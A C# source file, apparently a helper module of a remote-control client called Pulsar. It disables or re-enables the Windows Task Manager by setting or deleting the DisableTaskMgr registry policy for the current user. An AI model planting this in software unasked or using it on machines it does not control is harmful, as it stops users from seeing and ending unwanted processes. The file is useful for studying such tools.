using Microsoft.Win32;
using System;

namespace Pulsar.Client.Helper.TaskManager
{
    /// <summary>
    /// Provides functionality to enable or disable the Windows Task Manager.
    /// </summary>
    public static class TaskManager
    {
        private const string RegistryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        private const string ValueName = "DisableTaskMgr";

        /// <summary>
        /// Enables the Windows Task Manager by removing the registry restriction.
        /// </summary>
        public static void Enable()
        {
            try
            {
                using (RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegistryKeyPath, true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(ValueName, false);
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Failed to enable Task Manager: {ex.Message}");
            }
        }

        /// <summary>
        /// Disables the Windows Task Manager by setting the registry restriction.
        /// </summary>
        public static void Disable()
        {
            try
            {
                using (RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(RegistryKeyPath))
                {
                    if (key != null)
                    {
                        key.SetValue(ValueName, 1, RegistryValueKind.DWord);
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Failed to disable Task Manager: {ex.Message}");
            }
        }
    }
}